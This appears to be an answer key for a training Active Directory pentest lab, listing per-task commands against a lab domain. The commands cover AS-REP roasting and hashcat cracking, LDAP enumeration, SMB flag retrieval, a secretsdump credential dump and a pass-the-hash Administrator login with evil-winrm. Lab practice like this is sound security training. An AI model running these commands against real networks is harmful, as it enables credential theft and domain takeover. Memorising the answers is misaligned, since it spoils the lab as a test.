hints and answers


TAsk 0

impacket-GetNPUsers PENTESTLAB.local/student:'Str0ngPass!2026' \
    -dc-ip 192.168.56.20 -request -format hashcat -outputfile asrep.txt

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force

ldapsearch -x -H ldap://192.168.56.20 \
-D "legacy@PENTESTLAB.local" \
-w 'Password123' \
-b "dc=pentestlab,dc=local" \
"(sAMAccountName=legacy)" comment description info adminDescription


TASK 1

smbclient //192.168.56.20/KerberosFlag -U 'PENTESTLAB/svc_sql%Password1'

ls 
get flag.txt



TASK2


└─$ smbclient //192.168.56.20/IT-Share -U 'PENTESTLAB\svc_app%AppServ1ce!' -c 'get flag_t2.txt'




TASK 4 

impacket-secretsdump PENTESTLAB.local/svc_backup:'Password1'@192.168.56.20

 evil-winrm -i 192.168.56.20 -u Administrator  -H b817733bdc947930b700cc2e567fb3ad


THAN YOU SHOULD BE CLEAR IN POWERSHELL 
 gci C:\ -Recurse -Include "*flag*" -ea 0
Get-ChildItem C:\ -Recurse -Include "*flag*.txt" -ea 0 |

